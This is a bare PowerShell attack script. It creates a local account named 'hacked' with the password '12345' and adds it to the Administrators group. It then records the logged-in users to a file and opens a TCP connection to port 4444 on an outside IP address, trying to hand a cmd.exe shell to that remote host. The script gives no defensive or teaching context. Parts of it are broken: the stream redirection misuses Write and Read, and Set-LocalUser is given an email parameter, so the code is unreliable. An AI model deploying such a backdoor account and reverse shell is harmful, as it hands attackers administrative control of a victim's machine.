# Create a new user account
New-LocalUser   -Name "hacked" -Description "Hacked User" -Password (ConvertTo-SecureString "12345" -AsPlainText -Force)

# Add the user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member "hacked"

# Set the user's email address
Set-LocalUser -Name "hacked" -EmailAddress "hacked@hacked.com"

Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName | Out-File -FilePath "C:/online_users.txt"



# Define the IP and port
$ip = "217.160.74.6"
$port = 4444

# Create a new TCP client
$tcpClient = New-Object System.Net.Sockets.TcpClient

# Connect to the remote host
$tcpClient.Connect($ip, $port)

# Create a new stream
$stream = $tcpClient.GetStream()

# Create a new process
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "cmd.exe"
$process.StartInfo.UseShellExecute = $false
$process.StartInfo.RedirectStandardInput = $true
$process.StartInfo.RedirectStandardOutput = $true
$process.Start()

# Redirect the input and output streams
$stream.Write($process.StandardInput.BaseStream, 0, $process.StandardInput.BaseStream.Length)
$stream.Read($process.StandardOutput.BaseStream, 0, $process.StandardOutput.BaseStream.Length)

# Close the streams and the process
$stream.Close()
$process.Close()
